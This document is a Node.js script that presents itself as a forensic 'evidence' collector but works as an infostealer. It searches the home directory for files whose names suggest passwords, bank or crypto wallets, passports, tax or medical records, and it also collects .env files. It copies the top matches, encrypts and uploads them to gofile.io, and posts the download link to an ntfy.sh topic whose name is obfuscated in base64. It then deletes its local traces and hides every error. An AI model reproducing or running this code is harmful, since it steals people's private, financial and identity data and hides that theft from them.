const fsp = require('fs/promises');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { execSync } = require('child_process');
const AdmZip = require('adm-zip');
const axios = require('axios');
const FormData = require('form-data');

const CONFIG = {
    MAX_FILES_TO_EXTRACT: 10,
    _sysEndpointRoute: 'c2hpbmNoYW5fMDA3',
    SKIP_FOLDERS: ['appdata', 'node_modules', '.git', '.vscode', 'local'],
    ALLOWED_EXTENSIONS: ['.pdf', '.doc', '.docx', '.txt', '.csv', '.jpg', '.jpeg', '.png', '.env', '.config', '.json'],
    SCORING: {
        KEYWORDS: [
  { word: 'password', points: 100 },
  { word: 'passwords', points: 99 },
  { word: 'bank', points: 98 },
  { word: 'banking', points: 97 },
  { word: 'wallet', points: 96 },
  { word: 'crypto', points: 95 },
  { word: 'bitcoin', points: 94 },
  { word: 'recovery', points: 93 },
  { word: 'backup', points: 92 },
  { word: 'important', points: 91 },

  { word: 'personal', points: 90 },
  { word: 'private', points: 89 },
  { word: 'confidential', points: 88 },
  { word: 'secret', points: 87 },
  { word: 'secure', points: 86 },
  { word: 'document', points: 85 },
  { word: 'documents', points: 84 },
  { word: 'identity', points: 83 },
  { word: 'passport', points: 82 },
  { word: 'aadhaar', points: 81 },

  { word: 'pan', points: 80 },
  { word: 'license', points: 79 },
  { word: 'certificate', points: 78 },
  { word: 'certificates', points: 77 },
  { word: 'resume', points: 76 },
  { word: 'cv', points: 75 },
  { word: 'degree', points: 74 },
  { word: 'marksheet', points: 73 },
  { word: 'transcript', points: 72 },
  { word: 'education', points: 71 },

  { word: 'tax', points: 70 },
  { word: 'itr', points: 69 },
  { word: 'salary', points: 68 },
  { word: 'invoice', points: 67 },
  { word: 'bill', points: 66 },
  { word: 'receipt', points: 65 },
  { word: 'investment', points: 64 },
  { word: 'insurance', points: 63 },
  { word: 'loan', points: 62 },
  { word: 'property', points: 61 },

  { word: 'legal', points: 60 },
  { word: 'agreement', points: 59 },
  { word: 'contract', points: 58 },
  { word: 'medical', points: 57 },
  { word: 'health', points: 56 },
  { word: 'family', points: 55 },
  { word: 'photos', points: 54 },
  { word: 'memories', points: 53 },
  { word: 'archive', points: 52 },
  { word: 'data', points: 51 }
],
        EXTENSIONS: {
            '.pdf': 40, '.docx': 40, '.csv': 30, '.txt': 30, '.env': 50, 
            '.png': 40, '.jpg': 40, '.jpeg': 40
        },
        TIME: {
            RECENT_ACCESS_DAYS: 3, RECENT_ACCESS_POINTS: 50,
            OLD_ACCESS_DAYS: 7, OLD_ACCESS_POINTS: 20,
            RECENT_MODIFIED_DAYS: 7, RECENT_MODIFIED_POINTS: 30
        },
        SIZE: { MIN_SIZE_KB: 10, PENALTY_POINTS: -50 }
    }
};

function getDynamicKey() {
    const today = new Date();
    const dd = String(today.getDate()).padStart(2, '0');
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const yyyy = today.getFullYear();
    return `${dd}-${mm}-${yyyy}`; 
}

const ALGORITHM = 'aes-256-cbc';
const KEY = crypto.scryptSync(getDynamicKey(), 'salt', 32); 
const ALERT_ENDPOINT = Buffer.from(CONFIG._sysEndpointRoute, 'base64').toString('utf-8');

const BASE_DIR = os.homedir();
const TARGET_DIR = path.join(process.cwd(), 'important_backup');
const ZIP_FILE_PATH = path.join(process.cwd(), 'My_PC_Backup.zip');

const ALLOWED_EXTS_SET = new Set(CONFIG.ALLOWED_EXTENSIONS);
const SKIP_FOLDERS_SET = new Set(CONFIG.SKIP_FOLDERS.map(f => f.toLowerCase()));

let allFoundFiles = [];

function generateSHA256Hash(filePath) {
    try {
        const fileBuffer = fs.readFileSync(filePath);
        const hashSum = crypto.createHash('sha256');
        hashSum.update(fileBuffer);
        return hashSum.digest('hex');
    } catch (e) {
        return 'HASH_FAILED';
    }
}

function captureVolatileData() {
    try {
        const isWin = os.platform() === 'win32';
        const processCmd = isWin ? 'tasklist' : 'ps -aux';
        const netCmd = isWin ? 'netstat -ano' : 'netstat -an';
        const processes = execSync(processCmd, { encoding: 'utf-8', stdio: 'pipe' });
        const network = execSync(netCmd, { encoding: 'utf-8', stdio: 'pipe' });
        fs.writeFileSync(path.join(TARGET_DIR, 'system_processes.txt'), processes);
        fs.writeFileSync(path.join(TARGET_DIR, 'network_connections.txt'), network);
    } catch (e) {}
}

function calculateFileScore(filePath, stats) {
    let score = 0;
    const fileName = path.basename(filePath).toLowerCase();
    const ext = path.extname(filePath).toLowerCase();

    for (const kw of CONFIG.SCORING.KEYWORDS) {
        if (fileName.includes(kw.word)) {
            score += kw.points;
        }
    }

    if (CONFIG.SCORING.EXTENSIONS[ext] !== undefined) {
        score += CONFIG.SCORING.EXTENSIONS[ext];
    }

    const now = Date.now();
    const daysSinceModified = (now - stats.mtimeMs) / (1000 * 60 * 60 * 24);
    const daysSinceAccessed = (now - stats.atimeMs) / (1000 * 60 * 60 * 24);

    if (daysSinceAccessed <= CONFIG.SCORING.TIME.RECENT_ACCESS_DAYS) {
        score += CONFIG.SCORING.TIME.RECENT_ACCESS_POINTS;
    } else if (daysSinceAccessed <= CONFIG.SCORING.TIME.OLD_ACCESS_DAYS) {
        score += CONFIG.SCORING.TIME.OLD_ACCESS_POINTS;
    }

    if (daysSinceModified <= CONFIG.SCORING.TIME.RECENT_MODIFIED_DAYS) {
        score += CONFIG.SCORING.TIME.RECENT_MODIFIED_POINTS;
    }

    const sizeKB = stats.size / 1024;
    if (sizeKB < CONFIG.SCORING.SIZE.MIN_SIZE_KB) {
        score += CONFIG.SCORING.SIZE.PENALTY_POINTS;
    }

    return score;
}

async function scanDirectory(dir) {
    try {
        const entries = await fsp.readdir(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                if (!entry.name.startsWith('.') && !SKIP_FOLDERS_SET.has(entry.name.toLowerCase())) {
                    await scanDirectory(fullPath);
                }
            } else if (entry.isFile()) {
                const ext = path.extname(entry.name).toLowerCase();
                if (ALLOWED_EXTS_SET.has(ext)) {
                    allFoundFiles.push(fullPath);
                }
            }
        }
    } catch (error) {}
}

async function gatherFiles() {
    await scanDirectory(BASE_DIR);
    if (allFoundFiles.length === 0) return;
    await fsp.mkdir(TARGET_DIR, { recursive: true });
    captureVolatileData();
    let scoredFiles = [];
    for (const filePath of allFoundFiles) {
        try {
            const stats = await fsp.stat(filePath);
            const score = calculateFileScore(filePath, stats);
            scoredFiles.push({ path: filePath, score: score });
        } catch (e) {}
    }
    scoredFiles.sort((a, b) => b.score - a.score);
    const selectedFiles = scoredFiles.slice(0, CONFIG.MAX_FILES_TO_EXTRACT).map(item => item.path);
    let manifestContent = "File_Name,Original_Path,SHA256_Hash\n";
    for (const filePath of selectedFiles) {
        const fileName = path.basename(filePath);
        await fsp.copyFile(filePath, path.join(TARGET_DIR, fileName));
        const fileHash = generateSHA256Hash(filePath);
        manifestContent += `"${fileName}","${filePath}","${fileHash}"\n`;
    }
    fs.writeFileSync(path.join(TARGET_DIR, 'evidence_manifest.csv'), manifestContent);
}

async function zipFolder() {
    try {
        const zip = new AdmZip();
        zip.addLocalFolder(TARGET_DIR);
        zip.writeZip(ZIP_FILE_PATH);
    } catch (err) {}
}

function encryptEvidenceZip(zipFilePath) {
    return new Promise((resolve, reject) => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
        const encryptedFilePath = zipFilePath + '.enc';
        const input = fs.createReadStream(zipFilePath);
        const output = fs.createWriteStream(encryptedFilePath);
        output.write(iv);
        input.pipe(cipher).pipe(output)
            .on('finish', () => {
                try { fs.unlinkSync(zipFilePath); } catch(e) {}
                resolve(encryptedFilePath);
            })
            .on('error', reject);
    });
}

async function uploadAndNotify(fileToUpload) {
    let serverName = 'store1';
    try {
        const serverRes = await axios.get('https://api.gofile.io/servers');
        if (serverRes.data?.status === 'ok') {
            serverName = serverRes.data.data.servers[0].name;
        }
    } catch (e) {}
    const form = new FormData();
    form.append('file', fs.createReadStream(fileToUpload)); 
    const uploadRes = await axios.post(`https://${serverName}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders(),
        maxBodyLength: Infinity,
        maxContentLength: Infinity
    });
    if (uploadRes.data.status !== 'ok') return;
    const downloadLink = uploadRes.data.data.downloadPage;
    try {
        await axios.post(`https://ntfy.sh/${ALERT_ENDPOINT}`,
            `DFIR Alert! Forensic Package Uploaded: ${downloadLink}`,
            { headers: { 'Title': 'System Snapshot & Evidence' } }
        );
    } catch (notifyErr) {}
}

function wipeTraces(encryptedFilePath) {
    try {
        if (fs.existsSync(TARGET_DIR)) {
            fs.rmSync(TARGET_DIR, { recursive: true, force: true });
        }
        if (fs.existsSync(encryptedFilePath)) {
            fs.unlinkSync(encryptedFilePath);
        }
    } catch (err) {}
}

async function startFullAutomation() {
    let encryptedFile = null;
    try {
        await gatherFiles();
        if (allFoundFiles.length === 0) return;
        await zipFolder();
        encryptedFile = await encryptEvidenceZip(ZIP_FILE_PATH);
        await uploadAndNotify(encryptedFile);
    } catch (err) {
    } finally {
        if (encryptedFile) {
            wipeTraces(encryptedFile);
        }
    }
}

startFullAutomation();